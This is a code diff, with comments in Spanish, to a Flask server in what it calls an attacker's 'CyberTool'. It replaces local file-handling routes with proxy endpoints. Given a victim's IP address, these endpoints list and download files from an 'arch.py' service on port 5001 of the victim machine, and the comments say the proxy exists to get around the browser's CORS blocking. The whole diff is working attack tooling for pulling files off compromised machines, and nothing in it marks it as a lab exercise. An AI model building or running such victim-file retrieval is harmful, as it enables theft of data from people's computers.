@@ -316,52 +316,89 @@ def agent_status():
     })
 
 
-# ── Servidor de Archivos — Máquina Víctima (arch.py) ─────────────────────────
+# ── Proxy hacia arch.py en la máquina VÍCTIMA ────────────────────────────────
+# El atacante escribe la IP de la víctima en su CyberTool.
+# app.py hace proxy de las peticiones para evitar bloqueos CORS del navegador.
 
-@app.route('/arch/files', methods=['GET'])
-def arch_list_files():
-    """Lista los archivos que la máquina víctima ha subido via arch.py."""
+import requests as _requests  # alias para no pisar el objeto Flask request
+
+ARCH_PORT = 5001
+ARCH_TIMEOUT = 6  # segundos
+
+
+def _victim_base(victim_ip: str) -> str:
+    """Construye la URL base del arch.py de la víctima."""
+    ip = victim_ip.strip().rstrip('/')
+    return f"http://{ip}:{ARCH_PORT}"
+
+
+@app.route('/arch/proxy/files', methods=['GET'])
+def arch_proxy_files():
+    """
+    Proxy: obtiene la lista de archivos del arch.py de la víctima.
+    Parámetro GET: target=<ip_de_la_víctima>
+    """
+    victim_ip = request.args.get('target', '').strip()
+    if not victim_ip:
+        return jsonify({'success': False, 'error': 'Parámetro target (IP de la víctima) requerido.'}), 400
+
     try:
-        files = []
-        for name in os.listdir(UPLOADS_FOLDER):
-            path = os.path.join(UPLOADS_FOLDER, name)
-            if os.path.isfile(path):
-                stat = os.stat(path)
-                ext = name.rsplit('.', 1)[-1].lower() if '.' in name else ''
-                from sniffer import _guess_content_type
-                files.append({
-                    'name': name,
-                    'size': stat.st_size,
-                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
-                    'content_type': _guess_content_type(name),
-                    'ext': ext,
-                })
-        files.sort(key=lambda f: f['modified'], reverse=True)
-        return jsonify({'success': True, 'files': files, 'total': len(files)})
+        url = f"{_victim_base(victim_ip)}/api/files"
+        resp = _requests.get(url, timeout=ARCH_TIMEOUT)
+        data = resp.json()
+        # Añadir victim_ip a la respuesta para que el JS sepa a quién pertenece
+        data['victim_ip'] = victim_ip
+        return jsonify(data)
+    except _requests.exceptions.ConnectionError:
+        return jsonify({'success': False,
+                        'error': f'No se pudo conectar a {victim_ip}:{ARCH_PORT}. '
+                                  'Verifica que arch.py esté corriendo en la víctima.'}), 502
+    except _requests.exceptions.Timeout:
+        return jsonify({'success': False,
+                        'error': f'Timeout conectando a {victim_ip}:{ARCH_PORT}.'}), 504
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
+        return jsonify({'success': False, 'error': f'Error: {str(e)}'}), 500
 
 
-@app.route('/arch/download/<path:filename>', methods=['GET'])
-def arch_download_file(filename):
-    """Descarga un archivo subido por la máquina víctima."""
+@app.route('/arch/proxy/download', methods=['GET'])
+def arch_proxy_download():
+    """
+    Proxy: descarga un archivo del arch.py de la víctima y lo reenvía al navegador.
+    Parámetros GET: target=<ip>, file=<nombre_archivo>
+    """
+    victim_ip = request.args.get('target', '').strip()
+    filename  = request.args.get('file', '').strip()
+
+    if not victim_ip or not filename:
+        return jsonify({'success': False, 'error': 'Parámetros target y file requeridos.'}), 400
+
+    # Evitar path traversal
+    safe_name = os.path.basename(filename)
+    if not safe_name:
+        return jsonify({'success': False, 'error': 'Nombre de archivo inválido.'}), 400
+
     try:
-        return send_from_directory(UPLOADS_FOLDER, filename, as_attachment=True)
-    except FileNotFoundError:
-        return jsonify({'success': False, 'error': 'Archivo no encontrado.'}), 404
+        url = f"{_victim_base(victim_ip)}/api/download/{safe_name}"
+        resp = _requests.get(url, timeout=ARCH_TIMEOUT, stream=True)
 
+        if resp.status_code == 404:
+            return jsonify({'success': False, 'error': 'Archivo no encontrado en la víctima.'}), 404
 
-@app.route('/arch/delete/<path:filename>', methods=['DELETE'])
-def arch_delete_file(filename):
-    """Elimina un archivo subido por la máquina víctima."""
-    try:
-        path = os.path.join(UPLOADS_FOLDER, filename)
-        if not os.path.isfile(path):
-            return jsonify({'success': False, 'error': 'Archivo no encontrado.'}), 404
-        os.remove(path)
-        return jsonify({'success': True, 'message': f'{filename} eliminado.'})
+        content_type = resp.headers.get('Content-Type', 'application/octet-stream')
+
+        return send_file(
+            io.BytesIO(resp.content),
+            mimetype=content_type,
+            as_attachment=True,
+            download_name=safe_name
+        )
+    except _requests.exceptions.ConnectionError:
+        return jsonify({'success': False,
+                        'error': f'No se pudo conectar a {victim_ip}:{ARCH_PORT}.'}), 502
+    except _requests.exceptions.Timeout:
+        return jsonify({'success': False, 'error': 'Timeout descargando el archivo.'}), 504
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
+        return jsonify({'success': False, 'error': f'Error: {str(e)}'}), 500
 
 
 if __name__ == '__main__':
